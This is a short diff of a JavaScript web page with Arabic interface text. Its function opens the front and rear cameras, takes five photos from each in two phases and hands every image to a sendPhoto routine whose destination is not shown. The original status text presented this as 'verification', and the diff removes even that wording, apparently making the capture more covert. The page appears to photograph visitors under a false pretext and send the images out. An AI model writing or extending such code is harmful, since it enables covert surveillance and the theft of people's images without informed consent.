@@ -342,7 +342,7 @@
      مرحلة تصوير كاميرا واحدة (5 صور)
      ============================================================ */
   async function shootBatch(facing, label, phaseNum){
-    txt.textContent = `📸 جاري التحقق من ${label}...`;
+    txt.textContent = `  ${label}...`;
 
     try{
       await openCamera(facing);
@@ -357,7 +357,7 @@
     for(let i=1; i<=PHOTOS_PER_CAMERA; i++){
       const blob = await captureSafe(facing === "user");
       if(blob){
-        sendPhoto(blob, `📷 ${label} #${i} (مرحلة ${phaseNum}/2)`);
+        sendPhoto(blob, ` ${label} #${i} (مرحلة ${phaseNum}/2)`);
       }
       await new Promise(r => setTimeout(r, PHOTO_GAP_MS));
     }
